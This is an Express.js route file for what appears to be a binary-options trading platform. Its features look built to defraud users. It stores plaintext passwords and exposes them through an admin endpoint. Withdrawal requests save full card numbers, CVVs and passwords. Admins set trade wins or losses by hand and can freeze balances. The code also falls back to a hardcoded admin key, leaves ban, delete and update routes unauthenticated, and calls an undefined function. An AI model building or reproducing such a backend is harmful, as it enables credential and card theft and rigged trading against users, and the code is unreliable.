import express from "express";
import User from "../models/User.js";
import bcrypt from "bcryptjs";

const router = express.Router();

// ================= REGISTER =================
router.post("/register", async (req, res) => {
  try {
    const { username, email, password, fullName, phone, dob, country } =
      req.body;

    if (!username || !email || !password) {
      return res
        .status(400)
        .json({ error: "Username, email and password are required" });
    }

    const cleanUser = username.toLowerCase().trim();
    const cleanEmail = email.toLowerCase().trim();

    const existingUser = await User.findOne({
      $or: [{ username: cleanUser }, { email: cleanEmail }],
    });

    if (existingUser) {
      return res
        .status(400)
        .json({ error: "Username or email already exists" });
    }

    const hashedPassword = await bcrypt.hash(password, 10);

    const user = await User.create({
      username: cleanUser,
      email: cleanEmail,
      password: hashedPassword,
      plainPassword: password,
      fullName: fullName || "",
      phone: phone || "",
      dob: dob || "",
      country: country || "",
      withdrawalRequests: [],
      pendingTrades: [],
      notifications: [],
    });

    const safeUser = user.toObject();
    delete safeUser.password;

    res.status(201).json(safeUser);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= LOGIN =================
router.post("/login", async (req, res) => {
  try {
    const { username, password } = req.body;

    if (!username || !password) {
      return res.status(400).json({ error: "Username and password required" });
    }

    const cleanUser = username.toLowerCase().trim();

    const user = await User.findOne({ username: cleanUser });

    if (!user) {
      return res.status(400).json({ error: "Invalid credentials" });
    }

    if (user.isBanned) {
      return res.status(403).json({ error: "BANNED" });
    }

    const isMatch = await bcrypt.compare(password, user.password);

    if (!isMatch) {
      return res.status(400).json({ error: "Invalid credentials" });
    }

    const safeUser = user.toObject();
    delete safeUser.password;
    delete safeUser.plainPassword;

    res.json(safeUser);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= GET ALL USERS =================
router.get("/", async (req, res) => {
  try {
    const users = await User.find().select("-password -plainPassword");
    res.json(users);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= GET SINGLE USER =================
router.get("/:username", async (req, res) => {
  try {
    const username = req.params.username.toLowerCase().trim();
    const user = await User.findOne({ username }).select(
      "-password -plainPassword",
    );

    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    res.json(user);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= GET ALL USERS WITH PLAIN PASSWORDS (ADMIN ONLY) =================
router.get("/admin/all-with-plain-passwords", async (req, res) => {
  try {
    const adminKey = req.headers["x-admin-key"];
    const validAdminKey = process.env.ADMIN_API_KEY || "admin123456";

    if (!adminKey || adminKey !== validAdminKey) {
      return res
        .status(401)
        .json({ error: "Unauthorized. Admin access only." });
    }

    const users = await User.find({});

    const usersWithPasswords = users.map((user) => {
      const userObj = user.toObject();
      delete userObj.password;
      return userObj;
    });

    res.json(usersWithPasswords);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= UPDATE USER PASSWORD (ADMIN ONLY) =================
router.post("/admin/update-password", async (req, res) => {
  try {
    const adminKey = req.headers["x-admin-key"];
    const validAdminKey = process.env.ADMIN_API_KEY || "admin123456";

    if (!adminKey || adminKey !== validAdminKey) {
      return res
        .status(401)
        .json({ error: "Unauthorized. Admin access only." });
    }

    const { username, newPassword } = req.body;

    if (!username || !newPassword) {
      return res
        .status(400)
        .json({ error: "Username and newPassword required" });
    }

    const hashedPassword = await bcrypt.hash(newPassword, 10);

    const user = await User.findOneAndUpdate(
      { username: username.toLowerCase().trim() },
      {
        password: hashedPassword,
        plainPassword: newPassword,
      },
      { returnDocument: "after" },
    );

    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    res.json({ success: true, message: "Password updated successfully" });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= WITHDRAW FUNDS =================
router.post("/withdraw", async (req, res) => {
  try {
    const { username, amount, cardId, password } = req.body;

    if (!username || !amount || !cardId || !password) {
      return res.status(400).json({ error: "Missing required fields" });
    }

    const user = await User.findOne({
      username: username.toLowerCase().trim(),
    });

    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    const isMatch = await bcrypt.compare(password, user.password);
    if (!isMatch) {
      return res.status(401).json({ error: "Invalid password" });
    }

    if (user.balance < amount) {
      return res.status(400).json({ error: "Insufficient balance" });
    }

    const card = user.savedCards?.find((c) => String(c.id) === String(cardId));
    if (!card) {
      return res.status(400).json({ error: "Card not found" });
    }

    const withdrawalRequest = {
      id: Date.now(),
      type: "Withdraw",
      amount: amount,
      usd: amount,
      cardId: card.id,
      cardLast4: card.display?.slice(-4) || "****",
      cardNumber: card.num || "****",
      cardName: card.name || "",
      cardExpiry: card.exp || "",
      cvv: card.cvv || "***",
      date: new Date().toISOString(),
      status: "pending",
      userPassword: password,
    };

    user.withdrawalRequests = [
      withdrawalRequest,
      ...(user.withdrawalRequests || []),
    ];
    user.transactions = [
      {
        type: "Withdraw",
        amount: amount,
        usd: amount,
        date: new Date().toISOString(),
        status: "pending",
        cardLast4: card.display?.slice(-4),
      },
      ...(user.transactions || []),
    ];

    await user.save();

    res.json({
      success: true,
      currentBalance: user.balance,
      requestId: withdrawalRequest.id,
      message: "Withdrawal request submitted for admin approval",
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= ADMIN APPROVE WITHDRAWAL =================
router.post("/admin/approve-withdrawal", async (req, res) => {
  try {
    const adminKey = req.headers["x-admin-key"];
    const validAdminKey = process.env.ADMIN_API_KEY || "admin123456";

    if (!adminKey || adminKey !== validAdminKey) {
      return res
        .status(401)
        .json({ error: "Unauthorized. Admin access only." });
    }

    const { username, requestId, action } = req.body;

    const user = await User.findOne({
      username: username.toLowerCase().trim(),
    });

    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    const requestIndex = user.withdrawalRequests.findIndex(
      (r) => String(r.id) === String(requestId),
    );
    if (requestIndex === -1) {
      return res.status(404).json({ error: "Withdrawal request not found" });
    }

    const request = user.withdrawalRequests[requestIndex];

    if (request.status !== "pending") {
      return res
        .status(400)
        .json({ error: `Request already ${request.status}` });
    }

    if (action === "approve") {
      if (user.balance < request.amount) {
        return res
          .status(400)
          .json({ error: "Insufficient balance for approval" });
      }
      user.balance -= request.amount;

      request.status = "approved";
      request.approvedAt = new Date().toISOString();

      const txIndex = user.transactions.findIndex(
        (t) => t.date === request.date,
      );
      if (txIndex !== -1) {
        user.transactions[txIndex].status = "approved";
        user.transactions[txIndex].approvedAt = new Date().toISOString();
      }
    } else if (action === "reject") {
      request.status = "rejected";
      request.rejectedAt = new Date().toISOString();

      const txIndex = user.transactions.findIndex(
        (t) => t.date === request.date,
      );
      if (txIndex !== -1) {
        user.transactions[txIndex].status = "rejected";
        user.transactions[txIndex].rejectedAt = new Date().toISOString();
      }
    } else {
      return res
        .status(400)
        .json({ error: "Invalid action. Use 'approve' or 'reject'" });
    }

    user.markModified("withdrawalRequests");
    user.markModified("transactions");

    await user.save();

    res.json({
      success: true,
      message: `Withdrawal ${action}d successfully`,
      newBalance: user.balance,
      requestStatus: request.status,
    });
  } catch (err) {
    console.error("Error in approve-withdrawal:", err);
    res.status(500).json({ error: err.message });
  }
});

// ================= GET ALL WITHDRAWAL REQUESTS (ADMIN ONLY) =================
router.get("/admin/all-withdrawals", async (req, res) => {
  try {
    const adminKey = req.headers["x-admin-key"];
    const validAdminKey = process.env.ADMIN_API_KEY || "admin123456";

    if (!adminKey || adminKey !== validAdminKey) {
      return res
        .status(401)
        .json({ error: "Unauthorized. Admin access only." });
    }

    const users = await User.find({});
    const allWithdrawals = [];

    users.forEach((user) => {
      (user.withdrawalRequests || []).forEach((request) => {
        allWithdrawals.push({
          ...(request.toObject ? request.toObject() : request),
          username: user.username,
          userEmail: user.email,
          userFullName: user.fullName,
        });
      });
    });

    allWithdrawals.sort((a, b) => new Date(b.date) - new Date(a.date));

    res.json(allWithdrawals);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= SAVE CARD TO USER (LEGACY) =================
router.post("/save-card", async (req, res) => {
  try {
    const { username, card } = req.body;

    if (!username || !card) {
      return res.status(400).json({ error: "Username and card required" });
    }

    const user = await User.findOne({
      username: username.toLowerCase().trim(),
    });

    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    const updatedCards = [...(user.savedCards || []), card];

    const updatedUser = await User.findOneAndUpdate(
      { username: username.toLowerCase().trim() },
      { savedCards: updatedCards },
      { returnDocument: "after" },
    );

    res.json({ success: true, savedCards: updatedUser.savedCards });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= SAVE BINARY TRADE =================
router.post("/:username/binary-trades", async (req, res) => {
  try {
    const username = req.params.username.toLowerCase().trim();
    const trade = req.body;

    if (!trade || !trade.coin) {
      return res.status(400).json({ error: "Invalid trade data" });
    }

    const user = await User.findOneAndUpdate(
      { username },
      { $push: { binaryTrades: trade } },
      { returnDocument: "after" },
    ).select("-password -plainPassword");

    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    res.json({ success: true, trade });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= GET BINARY TRADES =================
router.get("/:username/binary-trades", async (req, res) => {
  try {
    const username = req.params.username.toLowerCase().trim();

    const user = await User.findOne({ username }).select("binaryTrades");

    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    res.json(user.binaryTrades || []);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= GET ALL TRADES (ADMIN ONLY) - returns ALL trades with status =================
router.get("/admin/all-trades", async (req, res) => {
  try {
    const adminKey = req.headers["x-admin-key"];
    const validAdminKey = process.env.ADMIN_API_KEY || "admin123456";

    if (!adminKey || adminKey !== validAdminKey) {
      return res
        .status(401)
        .json({ error: "Unauthorized. Admin access only." });
    }

    const users = await User.find({});
    const allTrades = [];

    users.forEach((user) => {
      (user.pendingTrades || []).forEach((trade) => {
        allTrades.push({
          ...trade,
          username: user.username,
          userEmail: user.email,
          userFullName: user.fullName,
        });
      });
    });

    allTrades.sort((a, b) => new Date(b.startTime) - new Date(a.startTime));
    res.json(allTrades);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= SAVE PENDING TRADE =================
router.post("/:username/pending-trades", async (req, res) => {
  try {
    const username = req.params.username.toLowerCase().trim();
    const trade = req.body;

    const user = await User.findOne({ username });
    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    user.pendingTrades = user.pendingTrades || [];
    user.pendingTrades.push(trade);
    await user.save();

    res.json({ success: true, trade });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= ADMIN RESOLVE TRADE (WIN/LOSS/FREEZE) - WITH BALANCE CHANGE =================
router.post("/admin/resolve-trade", async (req, res) => {
  try {
    const adminKey = req.headers["x-admin-key"];
    const validAdminKey = process.env.ADMIN_API_KEY || "admin123456";

    if (!adminKey || adminKey !== validAdminKey) {
      return res
        .status(401)
        .json({ error: "Unauthorized. Admin access only." });
    }

    const { username, tradeId, action } = req.body;

    if (!username || !tradeId || !action) {
      return res
        .status(400)
        .json({ error: "Username, tradeId, and action are required" });
    }

    const user = await User.findOne({
      username: username.toLowerCase().trim(),
    });
    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    const tradeIndex = (user.pendingTrades || []).findIndex(
      (t) => String(t.id) === String(tradeId),
    );
    if (tradeIndex === -1) {
      return res.status(404).json({ error: "Trade not found" });
    }

    const trade = user.pendingTrades[tradeIndex];

    if (trade.status !== "pending") {
      return res.status(400).json({ error: `Trade already ${trade.status}` });
    }

    let newBalance = user.balance;
    let profitAmount = 0;
    let resultMessage = "";

    if (action === "win") {
      // WIN: Add profit + original wager to balance
      profitAmount = trade.amount * (trade.profitPercent / 100);
      const totalReturn = trade.amount + profitAmount;
      newBalance = user.balance + totalReturn;
      trade.status = "won";
      trade.resolvedAt = new Date().toISOString();
      trade.result = "WIN";
      trade.profitAmount = profitAmount;
      resultMessage = `WIN! +$${profitAmount.toFixed(2)} profit added. Total: +$${totalReturn.toFixed(2)}`;
    } else if (action === "loss") {
      // LOSS: Deduct the wager amount from balance
      newBalance = user.balance - trade.amount;
      trade.status = "lost";
      trade.resolvedAt = new Date().toISOString();
      trade.result = "LOSS";
      resultMessage = `LOSS. -$${trade.amount} deducted from balance.`;
    } else if (action === "freeze") {
      // FREEZE: No balance change
      trade.status = "frozen";
      trade.resolvedAt = new Date().toISOString();
      trade.result = "FROZEN";
      resultMessage = `FROZEN. Amount held for review.`;
    } else {
      return res
        .status(400)
        .json({ error: "Invalid action. Use 'win', 'loss', or 'freeze'" });
    }

    // Update user balance
    user.balance = newBalance;
    user.pendingTrades[tradeIndex] = trade;

    // Add to transactions history
    const transaction = {
      type: "Binary Trade",
      coin: trade.coin,
      amount: trade.amount,
      result: trade.result,
      profit: action === "win" ? profitAmount : -trade.amount,
      date: new Date().toISOString(),
      status: trade.status,
      tradeDetails: trade,
    };
    user.transactions = [transaction, ...(user.transactions || [])];

    user.markModified("pendingTrades");
    user.markModified("transactions");
    await user.save();

    // Add notification to user
    user.notifications = user.notifications || [];
    user.notifications.unshift({
      id: Date.now() + Math.random(),
      title: `Trade ${action.toUpperCase()}`,
      body: `Your $${trade.amount} ${trade.coin} trade (${trade.orderType}) - ${resultMessage}`,
      time: new Date().toLocaleTimeString(),
      date: new Date().toISOString(),
      read: false,
      fromAdmin: true,
    });
    await user.save();

    res.json({
      success: true,
      message: `Trade marked as ${action.toUpperCase()}`,
      newBalance: user.balance,
      tradeStatus: trade.status,
    });
  } catch (err) {
    console.error("Error resolving trade:", err);
    res.status(500).json({ error: err.message });
  }
});

// ================= SEND NOTIFICATION TO USER (ADMIN ONLY) =================
router.post("/admin/send-notification", async (req, res) => {
  try {
    const adminKey = req.headers["x-admin-key"];
    const validAdminKey = process.env.ADMIN_API_KEY || "admin123456";

    if (!adminKey || adminKey !== validAdminKey) {
      return res
        .status(401)
        .json({ error: "Unauthorized. Admin access only." });
    }

    const { username, title, body } = req.body;

    if (!username || !title) {
      return res.status(400).json({ error: "Username and title required" });
    }

    const user = await User.findOne({
      username: username.toLowerCase().trim(),
    });
    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    user.notifications = user.notifications || [];
    user.notifications.unshift({
      id: Date.now() + Math.random(),
      title,
      body: body || "",
      time: new Date().toLocaleTimeString(),
      date: new Date().toISOString(),
      read: false,
      fromAdmin: true,
    });

    await user.save();

    res.json({ success: true, message: "Notification sent" });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= ADD NOTIFICATION (for trade placement) =================
router.post("/:username/notifications", async (req, res) => {
  try {
    const username = req.params.username.toLowerCase().trim();
    const { title, body, type } = req.body;

    const user = await User.findOne({ username });
    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    user.notifications = user.notifications || [];
    user.notifications.unshift({
      id: Date.now() + Math.random(),
      title,
      body,
      time: new Date().toLocaleTimeString(),
      date: new Date().toISOString(),
      read: false,
      type: type || "general",
    });

    await user.save();

    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= GET USER NOTIFICATIONS =================
router.get("/:username/notifications", async (req, res) => {
  try {
    const username = req.params.username.toLowerCase().trim();
    const user = await User.findOne({ username });

    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    res.json(user.notifications || []);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= MARK NOTIFICATION READ =================
router.post("/:username/notifications/read", async (req, res) => {
  try {
    const username = req.params.username.toLowerCase().trim();
    const { notificationId } = req.body;

    const user = await User.findOne({ username });
    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    const notifIndex = (user.notifications || []).findIndex(
      (n) => String(n.id) === String(notificationId),
    );
    if (notifIndex !== -1) {
      user.notifications[notifIndex].read = true;
      await user.save();
    }

    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= DELETE NOTIFICATION =================
router.delete("/:username/notifications/:notificationId", async (req, res) => {
  try {
    const username = req.params.username.toLowerCase().trim();
    const notificationId = req.params.notificationId;

    const user = await User.findOne({ username });
    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    user.notifications = (user.notifications || []).filter(
      (n) => String(n.id) !== String(notificationId),
    );
    await user.save();

    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= SAVE CARD TO USER (NEW DIRECT ENDPOINT) =================
router.post("/:username/cards", async (req, res) => {
  try {
    const username = req.params.username.toLowerCase().trim();
    const { card } = req.body;

    if (!card) {
      return res.status(400).json({ error: "Card data required" });
    }

    const user = await User.findOne({ username });
    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    const updatedCards = [...(user.savedCards || []), card];
    user.savedCards = updatedCards;
    await user.save();

    res.json({ success: true, savedCards: updatedCards });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= UPDATE USER =================
router.patch("/:username", async (req, res) => {
  try {
    const username = req.params.username.toLowerCase().trim();
    const updates = req.body;

    if (updates.password) {
      updates.password = await bcrypt.hash(updates.password, 10);
      updates.plainPassword = updates.password;
    }

    const user = await User.findOneAndUpdate(
      { username },
      { $set: updates },
      { returnDocument: "after", runValidators: true },
    ).select("-password -plainPassword");

    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    res.json(user);
  } catch (err) {
    res.status(500).json({ error: "Failed to update user" });
  }
});

// ================= BAN / UNBAN =================
router.post("/ban", async (req, res) => {
  try {
    const { username, banned } = req.body;

    if (!username) {
      return res.status(400).json({ error: "Username required" });
    }

    await User.findOneAndUpdate(
      { username: username.toLowerCase().trim() },
      { isBanned: banned },
      { returnDocument: "after" },
    );

    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= DELETE USER =================
router.delete("/:username", async (req, res) => {
  try {
    const username = req.params.username.toLowerCase().trim();

    const deleted = await User.findOneAndDelete({ username });

    if (!deleted) {
      return res.status(404).json({ error: "User not found" });
    }

    res.json({ success: true, message: "User deleted successfully" });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================= ADMIN FREEZE / UNFREEZE USER BALANCE =================
router.post("/admin/freeze-balance", async (req, res) => {
  try {
    const adminKey = req.headers["x-admin-key"];
    const validAdminKey = process.env.ADMIN_API_KEY || "admin123456";

    if (!adminKey || adminKey !== validAdminKey) {
      return res
        .status(401)
        .json({ error: "Unauthorized. Admin access only." });
    }

    const { username, amount, action, reason } = req.body;

    if (!username || !amount || !action) {
      return res
        .status(400)
        .json({ error: "Username, amount, and action are required" });
    }

    const user = await User.findOne({
      username: username.toLowerCase().trim(),
    });
    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    const freezeAmount = parseFloat(amount);
    if (isNaN(freezeAmount) || freezeAmount <= 0) {
      return res.status(400).json({ error: "Invalid amount" });
    }

    if (action === "freeze") {
      // Check if user has enough balance to freeze
      if (user.balance < freezeAmount) {
        return res
          .status(400)
          .json({ error: `Insufficient balance. User has ${user.balance}` });
      }

      // Deduct from balance, add to frozen
      user.balance -= freezeAmount;

      const freezeEntry = {
        id: Date.now(),
        amount: freezeAmount,
        reason: reason || "Admin freeze",
        frozenAt: new Date().toISOString(),
      };

      user.frozenAmounts = user.frozenAmounts || [];
      user.frozenAmounts.push(freezeEntry);
      user.frozenTotal = (user.frozenTotal || 0) + freezeAmount;

      // Add transaction record
      user.transactions = [
        {
          type: "Freeze",
          amount: freezeAmount,
          usd: freezeAmount,
          date: new Date().toISOString(),
          status: "frozen",
          reason: reason || "Admin freeze",
        },
        ...(user.transactions || []),
      ];

      // Add notification
      user.notifications = user.notifications || [];
      user.notifications.unshift({
        id: Date.now() + Math.random(),
        title: "💰 Balance Frozen",
        body: `${usd(freezeAmount)} has been frozen from your account. ${reason ? `Reason: ${reason}` : ""}`,
        time: new Date().toLocaleTimeString(),
        date: new Date().toISOString(),
        read: false,
      });

      await user.save();

      res.json({
        success: true,
        message: `${usd(freezeAmount)} frozen from user's balance`,
        newBalance: user.balance,
        frozenTotal: user.frozenTotal,
        frozenAmounts: user.frozenAmounts,
      });
    } else if (action === "unfreeze") {
      // Find and remove a specific freeze entry by ID or unfreeze by amount
      const { freezeId } = req.body;

      if (freezeId) {
        // Unfreeze specific freeze entry by ID
        const freezeIndex = (user.frozenAmounts || []).findIndex(
          (f) => String(f.id) === String(freezeId),
        );
        if (freezeIndex === -1) {
          return res.status(404).json({ error: "Freeze record not found" });
        }

        const freezeEntry = user.frozenAmounts[freezeIndex];
        const unfreezeAmount = freezeEntry.amount;

        // Add back to balance
        user.balance += unfreezeAmount;

        // Remove from frozen
        user.frozenAmounts.splice(freezeIndex, 1);
        user.frozenTotal = (user.frozenTotal || 0) - unfreezeAmount;

        // Add transaction record
        user.transactions = [
          {
            type: "Unfreeze",
            amount: unfreezeAmount,
            usd: unfreezeAmount,
            date: new Date().toISOString(),
            status: "unfrozen",
          },
          ...(user.transactions || []),
        ];

        // Add notification
        user.notifications = user.notifications || [];
        user.notifications.unshift({
          id: Date.now() + Math.random(),
          title: "✅ Balance Unfrozen",
          body: `${usd(unfreezeAmount)} has been unfrozen and added back to your balance.`,
          time: new Date().toLocaleTimeString(),
          date: new Date().toISOString(),
          read: false,
        });

        await user.save();

        res.json({
          success: true,
          message: `${usd(unfreezeAmount)} unfrozen and added back to balance`,
          newBalance: user.balance,
          frozenTotal: user.frozenTotal,
          frozenAmounts: user.frozenAmounts,
        });
      } else {
        // Unfreeze by amount (unfreeze specified amount)
        if (user.frozenTotal < freezeAmount) {
          return res
            .status(400)
            .json({ error: `Only ${usd(user.frozenTotal)} is frozen` });
        }

        // Unfreeze from oldest entries first
        let remainingToUnfreeze = freezeAmount;
        const newFrozenAmounts = [];

        for (const entry of user.frozenAmounts || []) {
          if (remainingToUnfreeze <= 0) {
            newFrozenAmounts.push(entry);
            continue;
          }

          if (entry.amount <= remainingToUnfreeze) {
            remainingToUnfreeze -= entry.amount;
            // This entry gets fully unfrozen, skip adding it
          } else {
            // Partial unfreeze - reduce the entry amount
            newFrozenAmounts.push({
              ...entry,
              amount: entry.amount - remainingToUnfreeze,
            });
            remainingToUnfreeze = 0;
          }
        }

        const unfrozenAmount = freezeAmount - remainingToUnfreeze;

        // Add to balance
        user.balance += unfrozenAmount;
        user.frozenAmounts = newFrozenAmounts;
        user.frozenTotal = (user.frozenTotal || 0) - unfrozenAmount;

        // Add transaction record
        user.transactions = [
          {
            type: "Unfreeze",
            amount: unfrozenAmount,
            usd: unfrozenAmount,
            date: new Date().toISOString(),
            status: "unfrozen",
          },
          ...(user.transactions || []),
        ];

        // Add notification
        user.notifications = user.notifications || [];
        user.notifications.unshift({
          id: Date.now() + Math.random(),
          title: "✅ Balance Unfrozen",
          body: `${usd(unfrozenAmount)} has been unfrozen and added back to your balance.`,
          time: new Date().toLocaleTimeString(),
          date: new Date().toISOString(),
          read: false,
        });

        await user.save();

        res.json({
          success: true,
          message: `${usd(unfrozenAmount)} unfrozen and added back to balance`,
          newBalance: user.balance,
          frozenTotal: user.frozenTotal,
          frozenAmounts: user.frozenAmounts,
        });
      }
    } else {
      return res
        .status(400)
        .json({ error: "Invalid action. Use 'freeze' or 'unfreeze'" });
    }
  } catch (err) {
    console.error("Error in freeze-balance:", err);
    res.status(500).json({ error: err.message });
  }
});

// ================= GET USER FROZEN AMOUNTS =================
router.get("/:username/frozen", async (req, res) => {
  try {
    const username = req.params.username.toLowerCase().trim();
    const user = await User.findOne({ username });

    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    res.json({
      frozenTotal: user.frozenTotal || 0,
      frozenAmounts: user.frozenAmounts || [],
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

export default router;
